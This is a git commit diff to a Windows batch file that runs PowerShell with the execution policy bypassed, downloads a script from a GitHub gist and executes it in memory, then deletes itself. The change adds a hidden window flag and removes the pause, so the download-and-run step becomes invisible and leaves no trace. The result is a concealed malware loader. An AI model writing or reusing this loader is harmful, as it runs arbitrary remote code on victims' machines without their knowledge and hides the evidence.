00c0350ef322a2fa034d84d0093890ff6d7891be
www.DeepSinker.com <suhelabasher74@gmail.com>
2025-10-03 14:41:06 +0300

    Update asd.bat

--- asd.bat
+++ asd.bat
@@ -1,4 +1,3 @@
 @echo off
-powershell -ExecutionPolicy Bypass -Command "iex (New-Object System.Net.WebClient).DownloadString('https://gist.githubusercontent.com/HeySinker/a88321ab2c6a02b63101963eb7c61d68/raw/a550f20012a739060986dcd9a81df3d14a9915fb/s.txt')"
-pause
+powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "iex (New-Object System.Net.WebClient).DownloadString('https://gist.githubusercontent.com/HeySinker/a88321ab2c6a02b63101963eb7c61d68/raw/a550f20012a739060986dcd9a81df3d14a9915fb/s.txt')"
 del "%~f0"
